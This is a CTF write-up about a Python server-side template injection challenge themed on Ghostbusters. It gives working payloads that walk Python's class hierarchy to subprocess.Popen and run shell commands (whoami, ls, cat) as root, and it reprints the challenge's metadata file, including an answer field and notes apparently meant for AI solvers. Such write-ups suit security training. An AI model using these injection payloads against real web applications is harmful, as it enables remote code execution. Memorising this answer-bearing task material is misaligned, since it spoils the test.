---
layout: post
title: RIFFHACK - Ghostbusters Template Possession
date: 2026-06-22
description: Template injection in a web page
tags: writeups python web template
categories: writeups web
author: "Guillaume"
---

## Challenge Overview

- **Name of the CTF Event:** RIFFHACK
- **Challenge Name:** Ghostbusters Template Possession
- **Category:** Web
- **Description:** Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide.
- **Provided Files / URL:** `randomly generated url`
- **Goal:** Find the flag.

## Initial Analysis

The webpage contains a text input and a render button which renders the template in the text input.<br>
The input is prefilled with `Manifest level: {{ ecto_status }} | Proton surge: {{ proton_level }}` and is rendered as `Manifest level: unstable | Proton surge: 321`.<br>
To go further I need to know which template engine is beeing used by the server.

## Finding the template engine

I started with this template : `{{ 1 + 2 }}` which rendered as `3`. This allowed me to know that the templates are really beeing evaluated by the server.<br>
Since the template engines I am the most familliar with are in Python I tried to check if it was the case here with the template `{{ ''.__class__ }}` and it returned `<class 'str'>`. This proves that the template engine can execute Python code.

## Executing commands 

My goal is now to find a way to execute a command on the server.<br>
This is a very similar situation to the last part of the squ1rrelmail challenge of squ1rrel CTF 2026 which has a writeup on this website. <br>
Using this matrial I know that the python instruction `''.__class__.__mro__[1].__subclasses__()` lists every defined Python classes. From here I just have to find the `subprocess.Popen` class to execute arbitrary bash commands on the server.<br>
I got lucky and this class wsa the last one of the list so I didn't had to do something complicated to find the index.<br>
I then tried my first payload : `{{ ''.__class__.__mro__[1].__subclasses__()[-1]('whoami', shell=True, stdout=-1).communicate()[0] }}` which returned `b'root'`.

## Finding the flag

To determine the file I needed to read I ran a `ls -l` and it returned `b'total 16\n-rw-r--r-- 1 root root  210 May 12 18:11 Dockerfile\n-rw-r--r-- 1 root root 4388 Jun 14 10:57 README.md\n-rw-r--r-- 1 root root 2152 May 12 18:11 app.py\n-rw-r--r-- 1 root root  874 Jun 12 10:56 challenge.json\n-rwxr-xr-x 1 root root 1606 May 12 18:11 exploit.py\n-rw-r--r-- 1 root root  279 May 12 18:11 required_files.txt\n-rw-r--r-- 1 root root   13 May 12 18:11 requirements.txt\ndrwxr-xr-x 2 root root 4096 May 12 18:11 templates\n'`. Since this is not very readable as is (at least for me) I formated it with a simple Python `print` and got :
```bash
total 16
-rw-r--r-- 1 root root  210 May 12 18:11 Dockerfile
-rw-r--r-- 1 root root 4388 Jun 14 10:57 README.md
-rw-r--r-- 1 root root 2152 May 12 18:11 app.py
-rw-r--r-- 1 root root  874 Jun 12 10:56 challenge.json
-rwxr-xr-x 1 root root 1606 May 12 18:11 exploit.py
-rw-r--r-- 1 root root  279 May 12 18:11 required_files.txt
-rw-r--r-- 1 root root   13 May 12 18:11 requirements.txt
drwxr-xr-x 2 root root 4096 May 12 18:11 templates
```

I got lucky again and started by reading `challenge.json`, with the full command beeing `{{ ''.__class__.__mro__[1].__subclasses__()[-1]('cat challenge.json', shell=True, stdout=-1).communicate()[0] }}` and got (after formating) :
```json
{
  "name": "Ghostbusters Template Possession",
  "description": "Spengler's Oscillation Translator is warping the containment HUD in impossible ways. The console still seems eager to reveal what the filters were meant to hide.",
  "category": "Web Exploitation",
  "difficulty": "Medium",
  "form": "flag",
  "points": 50,
  "hint": "Maybe the console's braces do more than decorate the chant. Try subtle calculations and watch what renders.",
  "assistant_practice_notes": "Figure out where your input is being rendered before you try payloads. The useful move is to prove whether the server is evaluating template syntax or merely echoing text, starting with the smallest harmless expression you can observe clearly.",
  "answer": "bitctf{{...}}",
  "country_code": "US",
  "challenge_type": "SERVICE-BASED",
  "supports_team_specific_flags": true
}
```

And so I could retrive the flag at the `answer` field.